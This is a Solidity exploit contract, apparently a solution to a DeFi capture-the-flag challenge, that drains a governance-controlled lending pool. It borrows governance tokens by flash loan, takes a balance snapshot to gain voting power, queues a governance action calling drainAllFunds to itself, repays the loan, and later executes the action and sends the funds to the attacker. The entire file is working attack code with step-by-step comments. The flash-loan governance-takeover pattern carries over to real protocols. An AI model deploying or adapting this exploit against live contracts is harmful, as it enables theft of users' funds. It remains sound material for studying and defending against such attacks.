// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DefiCtfToken.sol";
import "../DefiCtfTokenSnapshot.sol";

interface IGovernorPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external;
    function executeAction(uint256 actionId) external;
}

contract AttackGovernor {
    uint256 public constant TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 public constant TOKENS_IN_POOL = 1_500_000 ether;

    address governorPoolAddress;
    address simpleGovernanceAddress;
    address attacker;

    address borrowedToken;
    uint256 borrowedAmount;

    constructor(address _governorPoolAddress, address _simpleGovernanceAddress) {
        governorPoolAddress = _governorPoolAddress;
        simpleGovernanceAddress = _simpleGovernanceAddress;
        attacker = msg.sender;
    }

    function attack() public {
        // Step 1: Take the flash loan from the Governor Pool
        IGovernorPool(governorPoolAddress).flashLoan(TOKENS_IN_POOL);
    }

    // Function called from the GovernorPool flashLoan function
    function receiveTokens(address token, uint256 borrowAmount) external {
        borrowedToken = token;
        borrowedAmount = borrowAmount;

        // Step 2: We need take a snapshot, in order to our balance to be updated with the received tokens and pass the require _hasEnoughVotes
        DefiCtfTokenSnapshot(token).snapshot();

        // Step 3: We queue an Action
        // Receiver: We pass the governorPoolAddress, since it's where the functionCallWithValue is going to be execute
        // Data: We pass the function from the governorPoolAddress that we want to be executed
        // WeiAmount: 0 Matters?
        ISimpleGovernance(simpleGovernanceAddress).queueAction(
            governorPoolAddress,
            abi.encodeWithSignature("drainAllFunds(address)", address(this)),
            0 // Matters -> On the OpenZeppelin documentation "the called Solidity function must be `payable`." -> drainAllFunds isn't payable but still works??
        );

        // Step 4: Now we can pay the flash loan because we just needed it to pass that require
        DefiCtfTokenSnapshot(token).transfer(msg.sender, borrowAmount);
    }

    // We need another function to execute the action and send the funds to the attacker due to the action delay
    function drainFunds() public {
        // Step 5: Since now the pool is full again, we execute the action
        ISimpleGovernance(simpleGovernanceAddress).executeAction(1);

        // Step 6: We send the funds to the attacker contract
        DefiCtfTokenSnapshot(borrowedToken).transfer(attacker, borrowedAmount);
    }
}